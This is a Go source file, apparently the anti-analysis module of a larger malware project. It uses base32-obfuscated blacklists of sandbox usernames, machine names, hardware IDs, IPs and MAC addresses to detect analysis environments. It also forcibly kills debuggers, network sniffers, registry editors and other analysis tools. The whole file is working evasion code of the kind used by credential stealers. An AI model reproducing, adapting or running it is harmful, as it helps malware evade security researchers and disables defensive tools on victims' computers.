package main

import (
	"bytes"
	"encoding/base32"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"github.com/shirou/gopsutil/v3/process"
)

func decode(s string) string {
	decoded, err := base32.StdEncoding.DecodeString(s)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func decodeList(list []string) []string {
	decoded := make([]string, len(list))
	for i, s := range list {
		decoded[i] = decode(s)
	}
	return decoded
}

type AntiDebug struct {
	blackListedUsers     []string
	blackListedPCNames   []string
	blackListedHWIDS     []string
	blackListedIPS       []string
	blackListedMacs      []string
	blacklistedProcesses []string
}

func NewAntiDebug() *AntiDebug {
	blackListedUsers := []string{
		"IJZHK3TP",
		"IFSG22LONFZXI4TBORXXE===",
		"K5CECR2VORUWY2LUPFAWGY3POVXHI===",
		"IFRGE6I=",
		"NBWWC4TD",
		"OBQXIZLY",
		"KJCGQSRQINHEMZLWPJMA====",
		"NNCWKY3GJV3WO2Q=",
		"IZZGC3TL",
		"HBHGYMCDN5WE4UJVMJYQ====",
		"JRUXGYI=",
		"JJXWQ3Q=",
		"M5SW64THMU======",
		"KB4G2ZCVJ5YFM6LY",
		"HBLGS6STJU======",
		"O4YGM2TVJ5LG2Q3DKA2UC===",
		"NRWVM53KNI4WE===",
		"KBYU6TTKJBLHOZLYONJQ====",
		"GN2TE5RZNU4A====",
		"JJ2WY2LB",
		"JBCVKZKSPJWA====",
		"MZZGKZA=",
		"ONSXE5TFOI======",
		"IJ3EUQ3IKJIG443YNY======",
		"JBQXE4TZEBFG62DOONXW4===",
		"KNYWORSPMYZUO===",
		"JR2WGYLT",
		"NVUWWZI=",
		"KBQXIZKY",
		"NA3WI2ZRPBIHE===",
		"JRXXK2LTMU======",
		"KVZWK4RQGE======",
		"ORSXG5A=",
		"KJDXUY2CKV4XE6TOKJSWO===",
	}

	blackListedPCNames := []string{
		"IJCUKNZTG4YEGLJYIMYEGLJU",
		"IRCVGS2UJ5IC2TSBJNDEMTKU",
		"K5EU4LJVIUYDOQ2PKM4UCTCS",
		"IIZTARRQGI2DELJRIM3ECLJU",
		"IRCVGS2UJ5IC2VSSKNIUYQKH",
		"KE4USQKUKJFVAUSI",
		"LBBTMNC2II======",
		"IRCVGS2UJ5IC2RBQGE4UORCN",
		"IRCVGS2UJ5IC2V2JHBBUYRKU",
		"KNCVEVSFKIYQ====",
		"JREVGQJNKBBQ====",
		"JJHUQTRNKBBQ====",
		"IRCVGS2UJ5IC2QRQKQ4TGRBW",
		"IRCVGS2UJ5IC2MKQLFFVAMRZ",
		"IRCVGS2UJ5IC2MKZGI2DGM2S",
		"K5EUYRKZKBBQ====",
		"K5HVESY=",
		"GZBTIRJXGMZUMLKDGJCDSLJU",
		"KJAUYUCIKMWVAQY=",
		"IRCVGS2UJ5IC2V2HGNGVSSST",
		"IRCVGS2UJ5IC2N2YIM3EORK2",
		"IRCVGS2UJ5IC2NKPKY4VGMCP",
		"KFQXEWTIOJSEE4DK",
		"J5JEKTCFIVIEG===",
		"IFJEGSCJIJAUYRCQIM======",
		"JJKUYSKBFVIEG===",
		"MQYWE3SKNNTFM3CI",
		"JZCVIVCZKBBQ====",
		"IRCVGS2UJ5IC2QSVI5EU6===",
		"IRCVGS2UJ5IC2Q2CI5IEMRKF",
		"KNCVEVSFKIWVAQY=",
		"KREVCSKZJRATSVCXGVGQ====",
		"IRCVGS2UJ5IC2S2BJRLESTSP",
		"INHU2UCOIFGUKXZUGA2DO===",
		"IRCVGS2UJ5IC2MJZJ5GEYVCE",
		"IRCVGS2UJ5IC2RCFGM3DSU2F",
		"IVATQQZSIUZECLKEGAYTOLJU",
		"IFEUIQKOKBBQ====",
		"JRKUGQKTFVIEG===",
		"JVAVEQ2JFVIEG===",
		"IFBUKUCD",
		"JVEUWRJNKBBQ====",
		"IRCVGS2UJ5IC2SKBKBFU4MKQ",
		"IRCVGS2UJ5IC2TSUKU3VMVKP",
		"JRHVKSKTIUWVAQY=",
		"KQYDAOJRG4======",
		"ORSXG5BUGI======",
	}

	blackListedHWIDS := []string{
		"G5AUENKDGQ4TILJTHFDDKLJUHE2DCLJZGE3DGLJUG5DDKNCEGZCDKMBRGY======",
		"GAZUIRJQGI4TILJQGQ4DALJQGVCEKLJRIEYDMLJTGUYDOMBQGA4DAMBQHE======",
		"GEYTCMJRGEYTCLJSGIZDELJTGMZTGLJUGQ2DILJVGU2TKNJVGU2TKNJVGU======",
		"GZDDGQ2BGVCUGLKCIVBTSLJUIE2EILJYGI3TILJRGEYTMOCGGY2DAMBVHA======",
		"IFCEKRKFIU4UKLKFIYYECLJWII4DILKCGE2EELKCHAZUCNJUIFDEGNJUHA======",
		"GRBTIQZUGU2DILJQGA2TALJTG4YTALJYGA2TQLKDIFBTANCGGU4TGNBUIE======",
		"GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIOJXGI======",
		"GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALJQGAYDAMBQGAYDAMBQGA======",
		"GVBEIMRUIQ2TMLJXHA4UMLJYGQ3DQLJXINCEGLKDIFATOMRSGJBUGMJSGE======",
		"GQ4TIMZUIQ2TGLJQGIYDALJZGA3DKLJSGUYDALJWGU4TAMRVGAYEKNBTHE======",
		"GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYEMMBSGI======",
		"G43TORBYGRBDGLJYHBCDCLJUGUYUGLJZGNCTILKEGIZTKMJXG42DEMCBG4======",
		"GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYDAQZWGU======",
		"IIYTCMJSGA2DELJVGJCTQLKFGI2UELJTGY2TKLJWIE2EMNJUGE2TKRCCIY======",
		"GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIOCGIU======",
		"IVBDCNRZGI2EELKGII3EILJUIZATCLJYGY3DMLJRG5BDSMKGGYZEMQRTG4======",
		"IEYTKQJZGMYEGLJYGI2TCLJZGY2DKLKBIY3DGLKFGQ2UCRBXGI4EGMRQIM======",
		"GY3UKNJZGVCUELJVGRAUGLJUIZDDALKCGVCTGLJTIRATOQZXII2TIN2FGM======",
		"IM3UIMRTGM2DELKBGVCDILJWHBATCLJVHFAUGLKDIY2DARRXGM2UEMZWGM======",
		"GYZTEMBTGM2DELJQIVBDALKBIEYUCLJUIRDDKLJTIZBDGN2EIJBDANRXGA======",
		"GQ2EEOJUIQ2TMLJWGVAUELKEIMYDELJYGZATALJZHAYTIM2BG42DEM2CIY======",
		"GY3DAOBQGAZUMLKFINCTILJUHE2EKLKCGA3UKLJRIM2DMMJVIQYUIOJTIM======",
		"IQ4TCNBSGA2DELJYIY2TCLJVIVDEMLKEGVDDQLKFIU4UCRJTIQYTMMBSIE======",
		"GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYDGQKGGA======",
		"HBBDIRJYGI3TQLJVGI2UGLJXGM2DGLKCHAZDKLJSHAYECRKCINCDGQSDII======",
		"GRCDIRCEIM4TILKFGA3EGLJUGRDDILJZGVDEKLJTGNATCQKEIE2UCQZSG4======",
		"G44UCRRVGI3TSLJRGZBUMLJUGA4TILJZG42TQLKGHA4ECNRRGZCDQMKCGQ======",
		"IZDDKNZXII3TSLJXHAZEKLJQIE2EILJYGU3DQLKCGM2UCOKCG5CUENZWII======",
		"GA4EGMKFGQYDALJTIM2TMLJRGFCUCLJYGAYDALJTINCUGRKGGQZUMRKEIU======",
		"GZCUGRKBIY3TELJTGU2DQLJUG43EGLKCIQ4EILJXGMYTGNCBHEYTQMSDHA======",
		"GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYDGOBWGU======",
		"GEYTSNRQGJCTQLJZGJDDSLKCIQ2EELJYHE3TSLKEIE3DQMRSG43EIMZYGU======",
		"GEZDEMBUIQ2TMLJSHBBTALKBIIYDGLJVGFBDOLJUGRATQQRXGUZDKMRVGA======",
		"GYZUMQJTGM2DELJTGFBTOLJUIU4EKLJYGA4DSLKEIFDEMNSDIU2UKOJWG4======",
		"GM3DKQRUGAYDALJTIIZDKLJRGFCUCLJYGAYDALJTINCUGRKGGQ2DAMJQIM======",
		"IQ4EGMZQGMZDQLJRIIYDMLJUGYYTCLJYIUZUGLKFGQZTGRRUIY4TOOJUIU======",
		"GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALJVGBCTKNBZGMZTSMKFIY======",
		"GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIRBZHA======",
		"GRBUEOBSGA2DELKCIE4EMLJRG42DQLKDHE2DCLJTGYZUGMZZGFBUCN2GGM======",
		"II3DINRUIEZEELJZGJBTOLJUII4TKLKBGJCDALKFGU2DCMBQHAYUEOBRGI======",
		"IJBDEMZTGM2DELJSIUYDCLJXGE4EMLKEGRATCLKFG5DDMOKEGAZDMNBSHA======",
		"HE4TEMKEIUZUCLJVIMYUCLKEIYYTCLJZGA3TQLJVGYZTIMJSGAYDAMBSGY======",
		"INBTKQRTIY3DELJSIEYDILJUIQZEKLKBGQ3EGLKBIE2DCQRXGA2TANZRGI======",
		"GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIOJYGY======",
		"IMZDIOJZGU3UCLKBIEYDQLJUIIZDCLJZGMZUMLJZGI3TCQSFIM3DGQZYGU======",
		"IJCTOOBUIQ2TMLJYGFDDKLJSIM4EILJZIQ2EELJVIFBDKNSGGA2UIOBWIU======",
		"IFBUCNRZGIYDALJTIM2EGLJRGFCUCLJYGAYDALJTINCUGRKGGQ2DAMKBIE======",
		"GNDDEOBUINATILJYIJCEMLJUHA4UELKBGI3TGLJUGFBDINCEGY3DQRRWIQ======",
		"IJBDMNCFGA2DILJYG5BECLKDHA2DOLKCIMYECLKDG44TORBRIEYTMQJVGA======",
		"GJCTMRSCGU4TILJZIQ2TKLJUGQZDILJYIU3TILKDIUZDKQJSGVCTGNSCGA======",
		"GQZECOBSGA2DELJTIYYTGLJVGEZEMLJVIUZUILJWIJDDIRSGIZCDQNJRHA======",
		"GM4ECQRTGM2DELKEG5CDALKEIZBTQLKDGU3EMLJXIZBTSRCGIU2UGOJXGI======",
		"GQ4DSNBRIFCTSLKEGUZEMLJRGFCEMLKCIJCECLJVGAZTOMZUHAZDMNBTGE======",
		"GAZTERJQGJBDILJQGQ4TSLJQGVBTGLJQHAYDMLJTIMYDOMBQGA4DAMBQHE======",
		"IRCDSQZTGM2DELKGII4DALJZIEZTCLKFIIYDILJVG44TIRJVIFCTEQRUIM======",
		"IUYDQRCFHFAUCLKDG4YDILJUGI3DCLKCGMZEILJVG5BDEQJTHE4TGNJRHA======",
		"GA3UKNBSIU2DELKGGQZUILJTIUYUGLJRIM3EELJZIM3UCQZRGIYEMM2CHE======",
		"HA4EIQZTGM2DELJRGJCTMLJXIQ3DELKCGBAUKLKDHAYEKNJXHBCTOQRQG4======",
		"GVCTGRJXIZCTALJSGYZTMLJUINBDOLJYGRDDKLJYIQZDMNJQIZDEKQZQIU======",
		"HE3EEQRTGM2DELJWGMZTKLJQIZATQLKCIEZDSLKFGFBECNKEHBDEKRSCIU======",
	}

	blackListedIPS := []string{
		"GM2S4MRSG4XDCNBWFYZDGNA=",
		"GE4TKLRXGQXDONROGIZDG===",
		"HA4C4MJTGIXDEMZRFY3TC===",
		"G44C4MJTHEXDQLRVGA======",
		"GIYC4OJZFYYTMMBOGE3TG===",
		"HA4C4MJVGMXDCOJZFYYTMOI=",
		"HA2C4MJUG4XDMMROGEZA====",
		"GE4TILRRGU2C4NZYFYYTMMA=",
		"HEZC4MRRGEXDCMBZFYYTMMA=",
		"GE4TKLRXGQXDONROGIZDE===",
		"GE4DQLRRGA2S4OJRFYYTCNQ=",
		"GM2C4MJQGUXDCOBTFY3DQ===",
		"HEZC4MRRGEXDKNJOGE4TS===",
		"G44S4MJQGQXDEMBZFYZTG===",
		"HE2S4MRVFYZDANBOHEYA====",
		"GM2C4MJUGUXDQOJOGE3TI===",
		"GEYDSLRXGQXDCNJUFY4TA===",
		"GEYDSLRRGQ2S4MJXGMXDCNRZ",
		"GM2C4MJUGEXDCNBWFYYTCNA=",
		"GIYTELRRGE4S4MRSG4XDCNJR",
		"GE4TKLRSGM4S4NJRFY2TS===",
		"GE4TELRUGAXDKNZOGIZTI===",
		"GY2C4MJSGQXDCMROGE3DE===",
		"GM2C4MJUGIXDONBOGIZDA===",
		"GE4DQLRRGA2S4OJRFYYTOMY=",
		"GEYDSLRXGQXDCNJUFY4TC===",
		"GM2C4MJQGUXDOMROGI2DC===",
		"GEYDSLRXGQXDCNJUFY4TE===",
		"GIYTGLRTGMXDCNBSFY2TA===",
		"GEYDSLRXGQXDCNJUFY4TC===",
		"HEZS4MRRGYXDONJOGIYDS===",
		"GE4TELRYG4XDEOBOGEYDG===",
		"HA4C4MJTGIXDEMRWFYZDAMY=",
		"GE4TKLRRHAYS4MJXGUXDCMBV",
		"HA4C4MJTGIXDEMRVFYYTAMA=",
		"HEZC4MRRGEXDCOJSFYYTINA=",
		"GM2C4OBTFY2DMLRRGMYA====",
		"GE4DQLRRGA2S4OJRFYYTIMY=",
		"GM2C4OBVFYZDIMZOGI2DC===",
		"GM2C4MJUGEXDENBVFYZDK===",
		"GE3TQLRSGM4S4MJWGUXDOMA=",
		"HA2C4MJUG4XDKNBOGEYTG===",
		"GE4TGLRRGI4C4MJRGQXDINI=",
		"HE2S4MRVFY4DCLRSGQ======",
		"HEZC4MRRGEXDKMROGYZA====",
		"HA4C4MJTGIXDEMRXFYZDGOA=",
		"GM2S4MJZHEXDMLRRGM======",
		"HAYC4MRRGEXDALRZG4======",
		"GM2C4OBVFYZDKMZOGE3TA===",
		"GIZS4MJSHAXDENBYFY2DM===",
		"GM2S4MRSHEXDMOJOGIZDO===",
		"GM2C4MJTHAXDSNROGIZQ====",
		"GE4TELRSGEYS4MJRGAXDONA=",
		"GM2S4MRTG4XDINZOGEZA====",
		"HA3S4MJWGYXDKMBOGIYTG===",
		"GM2C4MRVGMXDENBYFYZDEOA=",
		"GIYTELRRGE4S4MRSG4XDCNRX",
		"GE4TGLRSGI2S4MJZGMXDEMBR",
		"GM2C4MJUGUXDCOJVFY2TQ===",
		"GM2C4MJQGUXDALRSG4======",
		"GE4TKLRSGM4S4NJRFYZQ====",
		"GM2S4MJZGIXDSMZOGEYDO===",
		"GE2TILRWGEXDOMJOGUYA====",
		"GM2S4MJZHEXDCNZVFY3TQ===",
	}

	blackListedMacs := []string{
		"GAYDUMJVHI2WIORQGA5DANZ2GM2A====",
		"GAYDUZJQHI2GGOTCHA5DOYJ2GU4A====",
		"GAYDUMDDHIZDSORSMM5GGMJ2GIYQ====",
		"GAYDUMRVHI4TAORWGU5DGOJ2MU2A====",
		"MM4DUOLGHIYWIOTCGY5DKOB2MU2A====",
		"GAYDUMRVHI4TAORTGY5DMNJ2GBRQ====",
		"GAYDUMJVHI2WIORQGA5DAMB2MYZQ====",
		"GJSTUYRYHIZDIORUMQ5GMNZ2MRSQ====",
		"GAYDUMJVHI2WIORRGM5DMZB2GBRQ====",
		"GAYDUNJQHI2TMOTBGA5GIZB2GAYA====",
		"GAYDUMJVHI2WIORRGM5DMNR2MNQQ====",
		"GU3DUZJYHI4TEORSMU5DONR2GBSA====",
		"MFRTUMLGHI3GEOTEGA5DIOB2MZSQ====",
		"GAYDUZJQHI2GGORZGQ5DCZR2GIYA====",
		"GAYDUMJVHI2WIORQGA5DANJ2MQ2Q====",
		"GAYDUZJQHI2GGORUMI5DIYJ2GQYA====",
		"GQZDUMBRHIYGCORYME5DAMB2GIZA====",
		"GAYDUMLCHIZDCORRGM5DCNJ2GIYA====",
		"GAYDUMJVHI2WIORQGA5DANR2GQZQ====",
		"GAYDUMJVHI2WIORRMU5DAMJ2MM4A====",
		"GAYDUNJQHI2TMOTCGM5DGOB2GY4A====",
		"GYYDUMBSHI4TEORTMQ5GMMJ2GY4Q====",
		"GAYDUZJQHI2GGORXMI5DOYR2HA3A====",
		"GAYDUZJQHI2GGORUGY5GGZR2GAYQ====",
		"GQZDUOBVHIYDOOTGGQ5DQMZ2MQYA====",
		"GU3DUYRQHI3GMOTDME5DAYJ2MU3Q====",
		"GEZDUMLCHI4WKORTMM5GCNR2GJRQ====",
		"GAYDUMJVHI2WIORQGA5DCYZ2HFQQ====",
		"GAYDUMJVHI2WIORQGA5DCYJ2MI4Q====",
		"MI3DUZLEHI4WIORSG45GMNB2MZQQ====",
		"GAYDUMJVHI2WIORQGA5DAMJ2HAYQ====",
		"GRSTUNZZHJRTAOTEHE5GCZR2MMZQ====",
		"GAYDUMJVHI2WIOTCGY5GKMB2MNRQ====",
		"GAYDUMJVHI2WIORQGA5DAMR2GI3A====",
		"GAYDUNJQHI2TMOTCGM5DINJ2GAZQ====",
		"GEZDUODBHI2WGORSME5DMNJ2MQYQ====",
		"GAYDUMRVHI4TAORTGY5GMMB2GNRA====",
		"GAYDUMLCHIZDCORRGM5DENR2GQ2A====",
		"GNRTUZLDHJSWMORUGM5GMZJ2MRSQ====",
		"MQ2DUOBRHJSDOOTFMQ5DENJ2GU2A====",
		"GAYDUMRVHI4TAORTGY5DMNJ2GM4A====",
		"GAYDUMBTHI2DOORWGM5DQYR2MRSQ====",
		"GAYDUMJVHI2WIORQGA5DANJ2HBSA====",
		"GAYDUMDDHIZDSORVGI5DKMR2GUYA====",
		"GAYDUNJQHI2TMOTCGM5DIMR2GMZQ====",
		"GNRTUZLDHJSWMORUGQ5DAMJ2GBRQ====",
		"GA3DUNZVHI4TCORVHE5DGZJ2GAZA====",
		"GQZDUMBRHIYGCORYME5DAMB2GMZQ====",
		"MVQTUZRWHJTDCOTBGI5DGMZ2G43A====",
		"MFRTUMLGHI3GEOTEGA5DIZB2HE4A====",
		"GFSTUNTDHIZTIORZGM5DMOB2GY2A====",
		"GAYDUNJQHI2TMOTBGA5DMMJ2MFQQ====",
		"GQZDUMBRHIYGCORZGY5DAMB2GIZA====",
		"GAYDUNJQHI2TMOTCGM5DEMJ2GI4Q====",
		"GAYDUMJVHI2WIORQGA5DAMB2MIZQ====",
		"HE3DUMTCHJSTSORUGM5DSNR2G43A====",
		"MI2DUYJZHI2WCOTCGE5GGNR2MZSA====",
		"MQ2DUOBRHJSDOORYG45DANJ2MFRA====",
		"MFRTUMLGHI3GEOTEGA5DIOJ2HA3A====",
		"GUZDUNJUHIYDAORYMI5GCNR2GA4A====",
		"GAYDUMDDHIZDSORQGU5GIOB2GZSQ====",
		"GAYDUMRTHJRWIOTGMY5DSNB2MYYA====",
		"GAYDUZJQHI2GGOTEGY5DQNR2G43Q====",
		"GNRTUZLDHJSWMORUGQ5DAMJ2MFQQ====",
		"GAYDUMJVHI2WIORSGM5DIYZ2MEZQ====",
		"GAYDUMLCHIZDCORRGM5DGMZ2GU2Q====",
		"GAYDUMJVHI2WIORQGA5DAMB2ME2A====",
		"GE3DUZLGHIZDEORQGQ5GCZR2G43A====",
		"GAYDUMJVHI2WIORSGM5DIYZ2MFSA====",
		"GFQTUNTDHI3DEORWGA5DGYR2MY2A====",
		"GAYDUMJVHI2WIORQGA5DAMB2GFSA====",
		"GAYDUNJQHI2TMOTBGA5GGZB2ME4A====",
		"GAYDUNJQHI2TMOTCGM5GMYJ2GIZQ====",
		"GUZDUNJUHIYDAOTBGA5DIMJ2HEZA====",
		"GAYDUNJQHI2TMOTCGM5GMNR2GU3Q====",
		"GAYDUZJQHI2GGORVGY5DIMR2HE3Q====",
		"MNQTUNDEHI2GEOTDME5DCOB2MNRQ====",
		"MY3DUYJVHI2DCORTGE5GEMR2G44A====",
		"MQ3DUMBTHJSTIOTBMI5DONZ2HBSQ====",
		"GAYDUNJQHI2TMOTBMU5GEMR2MIYA====",
		"GAYDUNJQHI2TMOTCGM5DSNB2MNRA====",
		"GQZDUMBRHIYGCORYMU5DAMB2GIZA====",
		"GAYDUNJQHI2TMOTCGM5DIYZ2MJTA====",
		"GAYDUNJQHI2TMOTCGM5DAOJ2HFSQ====",
		"GAYDUNJQHI2TMOTCGM5DGOB2HA4A====",
		"GAYDUNJQHI2TMOTBGA5GIMB2MZQQ====",
		"GAYDUNJQHI2TMOTCGM5DSMJ2MM4A====",
		"GNSTUYZRHJTGIOTGGE5GEZR2G4YQ====",
		"GAYDUNJQHI2TMOTBGA5DMZB2HA3A====",
		"GAYDUNJQHI2TMOTBGA5GCZR2G42Q====",
		"GAYDUNJQHI2TMOTCGM5GIZB2GAZQ====",
		"MMZDUZLFHJQWMOTGMQ5DEOJ2GIYQ====",
		"GAYDUNJQHI2TMOTCGM5GKZJ2MUYQ====",
		"GAYDUNJQHI2TMOTBGA5DQNB2HA4A====",
		"GAYDUMLCHIZDCORRGM5DGMR2GIYA====",
		"GNRTUZLDHJSWMORUGQ5DAMB2MQYA====",
		"GAYDUNJQHI2TMOTBMU5GKNJ2MQ2Q====",
		"GAYDUNJQHI2TMORZG45GMNR2MM4A====",
		"GUZDUNJUHIYDAOTBMI5GIZJ2GU4Q====",
		"GAYDUNJQHI2TMOTCGM5DSZJ2HFSQ====",
		"GAYDUNJQHI2TMOTBGA5DGOJ2GE4A====",
		"GMZDUMJRHI2GIOTEGA5DIYJ2HFSQ====",
		"GAYDUNJQHI2TMOTCGM5GIMB2ME3Q====",
		"HE2DUZDFHI4DAOTEMU5DCYJ2GM2Q====",
		"GAYDUNJQHI2TMOTBMU5DKZB2MVQQ====",
		"GAYDUNJQHI2TMOTCGM5DCNB2GU4Q====",
		"MVQTUMBSHI3TKORTMM5DSMB2HFTA====",
		"GAYDUZJQHI2GGORUGQ5DONR2GU2A====",
		"MFRTUMLGHI3GEOTEGA5DIZB2MU2A====",
		"GUZDUNJUHIYDAORTMI5DOOB2GI2A====",
		"GAYDUNJQHI2TMOTCGM5DKMB2MRSQ====",
		"G5STUMBVHJQTGORWGI5DSYZ2GRSA====",
		"GUZDUNJUHIYDAOTCGM5GKNB2G4YQ====",
		"HEYDUNBYHI4WCORZMQ5GINJ2GI2A====",
		"GAYDUNJQHI2TMOTCGM5DGYR2ME3A====",
		"HEZDUNDDHJQTQORSGM5GMYZ2GJSQ====",
		"GVQTUZJSHJQTMOTBGQ5DINB2MRRA====",
		"GAYDUNJQHI2TMOTBMU5DMZR2GU2A====",
		"GQZDUMBRHIYGCORZGY5DAMB2GMZQ====",
		"GAYDUNJQHI2TMORZG45GCMJ2MY4A====",
		"GVSTUOBWHJSTIORTMQ5DAZB2MY3A====",
		"GAYDUNJQHI2TMOTCGM5GKYJ2MVSQ====",
		"GNSTUNJTHI4DCOTCG45DAMJ2GEZQ====",
		"GAYDUNJQHI2TMORZG45GKYZ2MYZA====",
		"GAYDUZJQHI2GGOTCGM5DKYJ2GJQQ====",
		"GEZDUZRYHI4DOOTBMI5DCMZ2MVRQ====",
		"GAYDUNJQHI2TMOTBGA5DGOB2GA3A====",
		"GJSTUNRSHJSTQORUG45DCNB2GQ4Q====",
		"GAYDUMDEHIZWCOTEGI5DIZR2GFTA====",
		"GYYDUMBSHI4TEORWGY5DCMB2G44Q====",
		"",
		"GAYDUNJQHI2TMOTBGA5GINZ2GM4A====",
		"MJSTUMBQHJSTKOTDGU5DAYZ2MU2Q====",
		"GAYDUNJQHI2TMOTBGA5DKOJ2GEYA====",
		"GAYDUNJQHI2TMOTBGA5DANR2HBSA====",
		"GAYDUZJQHI2GGOTDMI5DMMR2GA4A====",
		"GRSTUOBRHI4DCORYMU5DEMR2GRSQ====",
	}

	blacklistedProcesses := []string{
		"NB2HI4DEMVRHKZ3HMVZHK2I=",
		"O5UXEZLTNBQXE2Y=",
		"MZUWIZDMMVZA====",
		"OJSWOZLENF2A====",
		"MNWWI===",
		"ORQXG23NM5ZA====",
		"OZRG66DTMVZHM2LDMU======",
		"MRTDK43FOJ3A====",
		"OBZG6Y3FONZWQYLDNNSXE===",
		"OZRG66DUOJQXS===",
		"OZWXI33PNRZWI===",
		"OZWXOYLSMV2HEYLZ",
		"NFSGCNRU",
		"N5WGY6LEMJTQ====",
		"OBSXG5DVMRUW6===",
		"OZWXOYLSMV2XGZLS",
		"OZTWC5LUNBZWK4TWNFRWK===",
		"OZWWCY3UNBWHA===",
		"PA4TMZDCM4======",
		"OZWXG4TWMM======",
		"PAZTEZDCM4======",
		"OZWXK43SOZRQ====",
		"OBZGYX3DMM======",
		"OBZGYX3UN5XWY4Y=",
		"PBSW443FOJ3GSY3F",
		"OFSW25JNM5QQ====",
		"NJXWKYTPPBRW63TUOJXWY===",
		"NNZWI5LNOBSXEY3MNFSW45A=",
		"NNZWI5LNOBSXE===",
		"NJXWKYTPPBZWK4TWMVZA====",
	}

	return &AntiDebug{
		blackListedUsers:     decodeList(blackListedUsers),
		blackListedPCNames:   decodeList(blackListedPCNames),
		blackListedHWIDS:     decodeList(blackListedHWIDS),
		blackListedIPS:       decodeList(blackListedIPS),
		blackListedMacs:      decodeList(blackListedMacs),
		blacklistedProcesses: decodeList(blacklistedProcesses),
	}
}

func (ad *AntiDebug) checks(config Config) bool {
	debugging := false

	if config.CheckProcess {
		ad.checkProcess()
	}

	if config.Checknetwork {
		if ad.getNetwork() {
			debugging = true
		}
	}
	if config.CheckSystem {
		if ad.getSystem() {
			debugging = true
		}
	}

	return debugging
}

func (ad *AntiDebug) checkProcess() {
	procs, err := process.Processes()
	if err != nil {
		return
	}
	for _, proc := range procs {
		name, err := proc.Name()
		if err != nil {
			continue
		}
		lowerProc := strings.ToLower(name)
		for _, bl := range ad.blacklistedProcesses {
			if strings.Contains(lowerProc, strings.ToLower(bl)) {
				// Attempt to kill the process.
				_ = proc.Kill()
			}
		}
	}
}

func (ad *AntiDebug) getNetwork() bool {
	resp, err := http.Get("https://api64.ipify.org/")
	if err == nil {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err == nil {
			ip := strings.TrimSpace(string(body))
			for _, bip := range ad.blackListedIPS {
				if ip == bip {
					return true
				}
			}
		}
	}

	var mac string
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagLoopback == 0 && len(iface.HardwareAddr) != 0 {
				mac = iface.HardwareAddr.String()
				break
			}
		}
	}
	for _, bmac := range ad.blackListedMacs {
		if strings.EqualFold(mac, bmac) {
			return true
		}
	}
	return false
}

func (ad *AntiDebug) getSystem() bool {
	hwid := "None"
	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID")
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf
	if err := cmd.Run(); err == nil {
		hwid = strings.TrimSpace(outBuf.String())
	}

	username := os.Getenv("UserName")
	hostname := os.Getenv("COMPUTERNAME")

	minLen := len(ad.blackListedHWIDS)
	if len(ad.blackListedUsers) < minLen {
		minLen = len(ad.blackListedUsers)
	}
	if len(ad.blackListedPCNames) < minLen {
		minLen = len(ad.blackListedPCNames)
	}
	for i := 0; i < minLen; i++ {
		if hwid == ad.blackListedHWIDS[i] ||
			username == ad.blackListedUsers[i] ||
			hostname == ad.blackListedPCNames[i] {
			return true
		}
	}
	return false
}
